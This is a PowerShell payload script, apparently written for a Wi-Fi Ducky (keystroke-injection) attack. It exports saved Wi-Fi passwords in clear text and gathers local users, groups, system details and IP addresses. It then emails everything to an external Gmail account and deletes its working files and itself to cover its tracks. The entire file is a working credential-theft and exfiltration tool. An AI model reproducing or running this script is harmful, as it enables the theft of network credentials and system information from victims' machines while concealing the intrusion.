# Written by HonkinWaffles https://github.com/HonkinWaffles/Wi-Fi-Ducky-Scripts
# Description: Powershell Script to collect data on the local machine and email it to a external source (Gmail)

# <SENDER EMAIL ADDRESS> - Gmail account of the sender
# <SENDER PASSWORD> - Gmail account password
# <RECEPIENT EMAIL ADDRESS> - Recepient email address (Can be same as sender)

# Set Directory
$path = "C:\temp\234f23"
If(!(test-path $path))
{
      New-Item -ItemType Directory -Force -Path $path
}
Set-Location $path
$filename = '23rtg4t.txt'

# Get Wi-Fi Known Networks OutFile $filename
netsh wlan export profile key=clear
Get-ChildItem *.xml |ForEach-Object {
$xml=[xml] (get-content $_)
$a= "*******************************`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
Out-File $filename -Append -InputObject $a
}

# Enumerate local system information
Get-LocalUser | Out-File -Append $filename
Get-LocalGroup | Out-File -Append $filename
Get-Computerinfo | Out-File -Append $filename
Get-NetIPAddress | Out-File -Append $filename


# Email results
$FROM = "<SENDER EMAIL ADDRESS>"
$PASS = "<SENDER PASSWORD>"
$TO = "<RECEPIENT EMAIL ADDRESS>"

$PC_NAME = "$env:computername"
$SUBJECT = "Wi-Fi Ducky Data Collection - " + $PC_NAME
$BODY = "All the data about  " + $PC_NAME + " is in the attached file."
$ATTACH = '23rtg4t.txt'

Send-MailMessage -SmtpServer "smtp.gmail.com" -Port 587 -From ${FROM} -to ${TO} -Subject ${SUBJECT} -Body ${BODY} -Attachment ${ATTACH} -Priority High -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ${FROM}, (ConvertTo-SecureString -String ${PASS} -AsPlainText -force))


# Clear tracks
Set-location 'C:\'
Remove-Item -Path 'C:\temp\234f23' -Recurse -Force


# remove ducky payload
Remove-Item 2643.ps1
